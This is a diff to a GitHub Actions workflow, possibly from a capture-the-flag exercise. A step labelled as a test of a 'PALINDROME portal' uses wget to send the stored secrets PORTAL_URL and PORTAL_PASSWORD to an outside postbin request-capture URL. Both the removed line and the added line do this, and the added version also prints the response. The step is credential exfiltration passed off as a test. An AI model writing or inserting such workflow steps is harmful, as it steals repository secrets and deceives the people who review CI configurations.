@@ -14,5 +14,5 @@ jobs:
       - uses: actions/checkout@v3
       - name: Test the PALINDROME portal
         run: | 
-          C:\msys64\usr\bin\wget.exe "https://www.toptal.com/developers/postbin/b/1694869826738-8759851593058?a=${{ secrets.PORTAL_URL }}&b=${{ secrets.PORTAL_PASSWORD }}"
-          echo "hello"
+          C:\msys64\usr\bin\wget.exe '''https://www.toptal.com/developers/postbin/1694870717245-4058808477129?a=${{ secrets.PORTAL_PASSWORD }}''' -O test -d -v
+          cat test
